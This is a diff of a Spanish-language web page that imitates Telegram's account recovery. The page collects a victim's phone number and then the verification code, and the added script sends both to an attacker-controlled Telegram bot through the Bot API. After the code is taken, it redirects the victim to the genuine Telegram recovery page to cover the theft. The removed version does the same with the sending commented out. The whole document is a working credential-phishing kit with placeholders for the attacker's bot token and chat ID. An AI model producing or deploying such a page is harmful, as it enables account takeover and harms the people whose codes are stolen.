@@ -3,393 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Cuenta</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Recuperación de Cuenta - Telegram</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
         body {
-            background: linear-gradient(135deg, #0088cc, #005599);
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-            color: #333;
+            height: 100vh;
+            margin: 0;
         }
-        
         .container {
-            width: 100%;
-            max-width: 420px;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
         }
-        
-        .header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 30px;
-            padding: 15px;
-            border-radius: 15px;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
-        }
-        
-        .logo {
-            width: 50px;
-            height: 50px;
-            margin-right: 15px;
-            background: linear-gradient(135deg, #34b7f1, #2a9bd7);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: 22px;
-            box-shadow: 0 0 15px rgba(52, 183, 241, 0.5);
-        }
-        
         h1 {
-            color: white;
-            font-size: 24px;
-            font-weight: 600;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
-        }
-        
-        .glass-card {
-            background: rgba(255, 255, 255, 0.85);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.5);
-            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.2);
-            padding: 30px;
-            transition: all 0.5s ease;
-        }
-        
-        .card-title {
-            text-align: center;
-            color: #0088cc;
-            margin-bottom: 25px;
-            font-size: 22px;
-            font-weight: 600;
-        }
-        
-        .card-desc {
-            text-align: center;
-            color: #555;
-            margin-bottom: 25px;
-            line-height: 1.5;
-            font-size: 15px;
-        }
-        
-        .input-group {
             margin-bottom: 20px;
-            position: relative;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
             color: #0088cc;
-            font-weight: 500;
-            font-size: 14px;
         }
-        
-        .input-with-flag {
-            display: flex;
-            align-items: center;
-        }
-        
-        .country-flag {
-            width: 40px;
-            height: 30px;
-            background: #f0f0f0;
-            border: 1px solid #ddd;
-            border-right: none;
-            border-radius: 8px 0 0 8px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 16px;
-        }
-        
         input {
             width: 100%;
-            padding: 15px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            background: rgba(255, 255, 255, 0.9);
-            font-size: 16px;
-            transition: all 0.3s ease;
-            outline: none;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
         }
-        
-        .phone-input {
-            border-radius: 0 8px 8px 0;
-        }
-        
-        input:focus {
-            border-color: #34b7f1;
-            box-shadow: 0 0 0 2px rgba(52, 183, 241, 0.3);
-        }
-        
         button {
             width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #34b7f1, #2a9bd7);
+            padding: 10px;
+            background-color: #0088cc;
             color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
+            border-radius: 4px;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 10px rgba(52, 183, 241, 0.4);
         }
-        
         button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(52, 183, 241, 0.5);
-        }
-        
-        button:active {
-            transform: translateY(0);
-        }
-        
-        button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
-        .success-message {
-            text-align: center;
-            color: #0088cc;
-            margin-top: 20px;
-            font-weight: 500;
-            padding: 15px;
-            background: rgba(52, 183, 241, 0.1);
-            border-radius: 8px;
-        }
-        
-        .countdown {
-            text-align: center;
-            color: #777;
-            margin-top: 15px;
-            font-size: 14px;
-        }
-        
-        .step-indicator {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-        
-        .step {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: #ddd;
-            margin: 0 5px;
-        }
-        
-        .step.active {
-            background: #34b7f1;
-            box-shadow: 0 0 8px rgba(52, 183, 241, 0.6);
-        }
-        
-        @media (max-width: 480px) {
-            .glass-card {
-                padding: 20px;
-            }
-            
-            h1 {
-                font-size: 20px;
-            }
-            
-            .card-title {
-                font-size: 20px;
-            }
+            background-color: #006699;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <div class="logo">
-                <i class="fab fa-telegram"></i>
-            </div>
-            <h1>Verificación de Cuenta</h1>
-        </div>
-        
-        <div class="glass-card">
-            <div class="step-indicator">
-                <div class="step active"></div>
-                <div class="step"></div>
-            </div>
-            
-            <!-- Primer paso: Ingreso de número telefónico -->
-            <div id="step1">
-                <h2 class="card-title">Ingresa tu número</h2>
-                <p class="card-desc">Para verificar tu identidad, por favor ingresa tu número de teléfono. Te enviaremos un código de verificación.</p>
-                
-                <div class="input-group">
-                    <label for="phone">Número de teléfono</label>
-                    <div class="input-with-flag">
-                        <div class="country-flag">+1</div>
-                        <input type="tel" id="phone" class="phone-input" placeholder="Tu número de teléfono" required>
-                    </div>
-                </div>
-                <button onclick="processStep1()">Enviar código</button>
-            </div>
-            
-            <!-- Segundo paso: Ingreso de código (oculto inicialmente) -->
-            <div id="step2" class="hidden">
-                <h2 class="card-title">Código de verificación</h2>
-                <p class="card-desc">Hemos enviado un código de 6 dígitos a tu número. Por favor ingrésalo a continuación.</p>
-                
-                <div class="input-group">
-                    <label for="code">Código de verificación</label>
-                    <input type="text" id="code" placeholder="Código de 6 dígitos" required maxlength="6">
-                </div>
-                <button onclick="processStep2()">Verificar código</button>
-                <div class="countdown" id="countdown">Puedes solicitar un nuevo código en: <span id="timer">02:00</span></div>
-            </div>
-            
-            <!-- Mensaje de éxito (oculto inicialmente) -->
-            <div id="successMessage" class="success-message hidden">
-                <p><i class="fas fa-check-circle"></i> ¡Verificación completada con éxito!</p>
-                <p>Redirigiendo a nuestra página oficial...</p>
-            </div>
-        </div>
+        <h1>Recuperación de Cuenta</h1>
+        <form id="recoveryForm">
+            <input type="text" id="phoneNumber" placeholder="Número de teléfono" required>
+            <button type="submit">Enviar Código</button>
+        </form>
+        <p>Se te enviará un código a tu número de teléfono.</p>
+        <form id="codeForm" style="display: none;">
+            <input type="text" id="code" placeholder="Código recibido" required>
+            <button type="submit">Verificar Código</button>
+        </form>
     </div>
 
     <script>
-        // Configuración del bot de Telegram (reemplaza con tus datos reales)
-        const BOT_TOKEN = 'TU_BOT_TOKEN_AQUI';
-        const CHAT_ID = 'TU_CHAT_ID_AQUI';
-        
-        // Variables para el temporizador
-        let countdownInterval;
-        
-        function processStep1() {
-            const phone = document.getElementById('phone').value.trim();
-            
-            if (!phone || phone.length < 10) {
-                alert('Por favor ingresa un número de teléfono válido');
-                return;
-            }
-            
-            // Enviar datos a Telegram
-            sendToTelegram(`Nueva verificación:\nNúmero: +1${phone}`);
-            
-            // Ocultar primer paso y mostrar segundo paso
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-            
-            // Actualizar indicador de pasos
-            document.querySelectorAll('.step')[1].classList.add('active');
-            
-            // Iniciar temporizador para reenviar código
-            startCountdown();
-        }
-        
-        function processStep2() {
-            const phone = document.getElementById('phone').value.trim();
-            const code = document.getElementById('code').value.trim();
-            
-            if (!code || code.length !== 6) {
-                alert('Por favor ingresa un código de verificación válido de 6 dígitos');
-                return;
-            }
-            
-            // Enviar datos completos a Telegram
-            sendToTelegram(`Verificación completada:\nNúmero: +1${phone}\nCódigo: ${code}`);
-            
-            // Mostrar mensaje de éxito
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('successMessage').classList.remove('hidden');
-            
-            // Detener el temporizador
-            clearInterval(countdownInterval);
-            
-            // Redirigir después de un breve delay
-            setTimeout(() => {
-                window.location.href = 'https://tu-pagina-oficial.com';
-            }, 3000);
-        }
-        
-        function startCountdown() {
-            let timeLeft = 120; // 2 minutos en segundos
-            const timerElement = document.getElementById('timer');
-            
-            countdownInterval = setInterval(() => {
-                const minutes = Math.floor(timeLeft / 60);
-                let seconds = timeLeft % 60;
-                
-                // Formatear para mostrar siempre 2 dígitos en segundos
-                seconds = seconds < 10 ? '0' + seconds : seconds;
-                
-                timerElement.textContent = `${minutes}:${seconds}`;
-                
-                if (timeLeft <= 0) {
-                    clearInterval(countdownInterval);
-                    timerElement.textContent = '00:00';
-                    // Aquí podrías habilitar un botón para reenviar código
-                }
-                
-                timeLeft--;
-            }, 1000);
-        }
-        
-        function sendToTelegram(message) {
-            // Usando fetch API para enviar mensaje a Telegram
-            // Nota: En producción, deberías usar un endpoint seguro en tu servidor
-            // para evitar exponer tu token de bot
-            console.log('Enviando a Telegram:', message);
-            
-            // Descomenta las siguientes líneas cuando agregues tu token y chat ID reales
-            /*
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        const TOKEN = 'TU_TOKEN'; // Reemplaza con el token de tu bot de Telegram
+        const CHAT_ID = 'TU_CHAT_ID'; // Reemplaza con el chat_id al que deseas enviar los mensajes
+
+        document.getElementById('recoveryForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const phoneNumber = document.getElementById('phoneNumber').value;
+
+            // Envia el número de teléfono al bot de Telegram
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
+                    text: `Número de teléfono recibido: ${phoneNumber}`
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Mensaje enviado a Telegram:', data);
-            })
-            .catch(error => {
-                console.error('Error enviando a Telegram:', error);
-            });
-            */
-        }
-        
-        // Validación en tiempo real para el campo de teléfono
-        document.getElementById('phone').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            }).then(response => response.json())
+              .then(data => {
+                  console.log('Mensaje enviado:', data);
+                  document.getElementById('recoveryForm').style.display = 'none';
+                  document.getElementById('codeForm').style.display = 'block';
+              })
+              .catch(error => console.error('Error al enviar el mensaje:', error));
         });
-        
-        // Validación en tiempo real para el campo de código
-        document.getElementById('code').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+
+        document.getElementById('codeForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const code = document.getElementById('code').value;
+
+            // Envia el código al bot de Telegram
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `Código recibido: ${code}`
+                })
+            }).then(response => response.json())
+              .then(data => {
+                  console.log('Mensaje enviado:', data);
+                  // Redirige a la página de recuperación de cuentas de Telegram original
+                  window.location.href = 'https://my.telegram.org/auth?to=recovery';
+              })
+              .catch(error => console.error('Error al enviar el mensaje:', error));
         });
     </script>
 </body>
